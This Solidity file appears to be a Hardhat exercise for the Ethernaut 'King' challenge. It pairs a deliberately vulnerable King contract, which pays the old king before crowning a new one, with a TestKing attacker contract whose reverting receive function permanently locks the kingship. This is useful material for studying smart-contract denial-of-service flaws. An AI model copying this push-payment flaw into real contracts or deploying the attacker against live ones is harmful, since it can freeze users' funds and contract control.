// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    console.log("inside receive of king");
    console.log("message.sender");
    console.log(msg.sender);
    console.log("message value");
    console.log(msg.value);
    require(msg.value >= prize || msg.sender == owner);
    console.log("transfering ether to king");
    payable(king).transfer(msg.value);
    console.log("message.sender");
    console.log(msg.sender);
    console.log("message value");
    console.log(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}


contract TestKing {

    King king;
    bool accept = true;

    constructor(address _king) payable {
        king = King(payable(_king));
    }

    receive() external payable {
        console.log("inside recieve of TestKing");
        if(accept) {
            accept = false;
            return;
        }
        revert("You cannot become king");
    }

    function attack() public payable {
        console.log("inside attack function");
        console.log(msg.sender);
        console.log(msg.value);
        (bool success, ) = payable(address(king)).call{value: msg.value}("");
        console.log(success);
    }
}